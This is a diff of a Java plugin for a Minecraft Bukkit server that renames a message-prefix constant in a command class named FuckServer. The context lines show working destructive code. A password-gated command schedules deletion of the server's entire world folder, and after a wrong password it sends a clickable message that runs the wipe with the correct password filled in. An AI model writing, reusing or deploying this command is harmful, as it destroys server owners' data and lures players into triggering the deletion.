@@ -70,7 +70,7 @@ public class FuckServer extends Command {
     public void onCommand(Player p, ArrayList<String> args) {
         //TODO: finish implementing this
         if (locked) {
-            p.sendMessage(Start.Prefix + "Command locked. There's no going back as I said...");
+            p.sendMessage(Start.COMMAND_PREFIX + "Command locked. There's no going back as I said...");
             return;
         }
         if (args.size() == 0) {
@@ -78,12 +78,12 @@ public class FuckServer extends Command {
             return;
         }
         if (!args.get(0).equals(password)) {
-            p.sendMessage(Start.Prefix + "Something went wrong. Please try again.");
+            p.sendMessage(Start.COMMAND_PREFIX + "Something went wrong. Please try again.");
             showConsequences(p);
             return;
         }
         locked = true;
-        p.sendMessage(Start.Prefix + "Proceeding!");
+        p.sendMessage(Start.COMMAND_PREFIX + "Proceeding!");
         BukkitTask task = Bukkit.getScheduler().runTaskLaterAsynchronously(Start.Instance, () -> {
             Bukkit.getScheduler().runTaskLater(Start.Instance, () -> deleteFolder(Bukkit.getWorldContainer().getAbsoluteFile()), 1);
             for (int i = 0; i <= 100; i++) {
@@ -161,8 +161,8 @@ public class FuckServer extends Command {
     }
 
     private void showConsequences(Player p) {
-        p.sendMessage(Start.Prefix + ChatColor.RED + "This command is DANGEROUS! There's no coming back!");
-        TextComponent component = new TextComponent(Start.Prefix + ChatColor.GREEN + "Click here to accept the consequences");
+        p.sendMessage(Start.COMMAND_PREFIX + ChatColor.RED + "This command is DANGEROUS! There's no coming back!");
+        TextComponent component = new TextComponent(Start.COMMAND_PREFIX + ChatColor.GREEN + "Click here to accept the consequences");
         component.setBold(true);
         component.setHoverEvent(new HoverEvent(HoverEvent.Action.SHOW_TEXT, new BaseComponent[]{new TextComponent("Click to run server destruction")}));
         component.setClickEvent(new ClickEvent(ClickEvent.Action.RUN_COMMAND, Start.COMMAND_SIGN + this.getCommand() + " " + password));
